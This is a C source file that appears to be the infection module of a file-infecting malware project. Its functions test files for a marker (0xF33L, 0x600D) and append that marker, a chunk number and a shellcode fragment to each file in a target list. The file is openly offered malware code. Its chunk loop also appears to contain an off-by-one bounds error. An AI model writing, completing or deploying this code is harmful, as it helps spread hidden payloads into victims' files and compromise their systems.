#include "../includes/infection.h"

int is_infected(FILE *fp, int shellcode_chunk_size) {
  int result = false;
  int magic_bytes[2];

  if (!fp)
    return (false);
  fseek(fp, -(shellcode_chunk_size + 1 + sizeof(int) * 2), SEEK_END);
  fread(&magic_bytes, sizeof(int), 2, fp);
  if (magic_bytes[0] == 0xF33L && magic_bytes[1] == 0x600D)
    result = true;
  fseek(fp, 0, SEEK_SET);
  return (result);
}

// Returns true on success, and false on failure.
int infect_file(t_file *file, char *shellcode_chunk, unsigned int to_write, unsigned char chunk_number) {
  int magic_bytes[] = { 0xF33L, 0x600D };
  FILE *fp;

  printf("Infecting: %s\n", file->absolute_path); // TODO: Remove.
  fp = fopen(file->absolute_path, "a+b");
  if (!fp)
    return (false);
  if (is_infected(fp, to_write)) {
    printf("Already Infected: %s\n", file->absolute_path); // TODO: Remove.
    fclose(fp);
    return (true);
  }
  if (fwrite(&magic_bytes, sizeof(char), sizeof(int) * 2, fp) != sizeof(int) * 2) {
    fclose(fp);
    return (false);
  }
  if (fwrite(&chunk_number, sizeof(unsigned char), 1, fp) != 1) {
    fclose(fp);
    return (false);
  }
  if (fwrite(shellcode_chunk, sizeof(char), to_write, fp) != to_write) {
    fclose(fp);
    return (false);
  }
  fclose(fp);
  return (true);
}

// Takes an array of file paths to be infected.
// Returns false on error, true on success.
int infect_files(t_list *to_infect, t_shellcode **chunks, size_t chunk_count) {
  t_list *list_ptr;
  unsigned char chunk_num = 0;

  list_ptr = to_infect;
  while (list_ptr != NULL) {
    if (infect_file(((t_file*)list_ptr->data), chunks[chunk_num]->buf, chunks[chunk_num]->length, chunk_num) == false)
      return (false);
    chunk_num++;
    if (chunk_num > chunk_count)
      chunk_num = 0;
    list_ptr = list_ptr->next;
  }
  return (true);
}
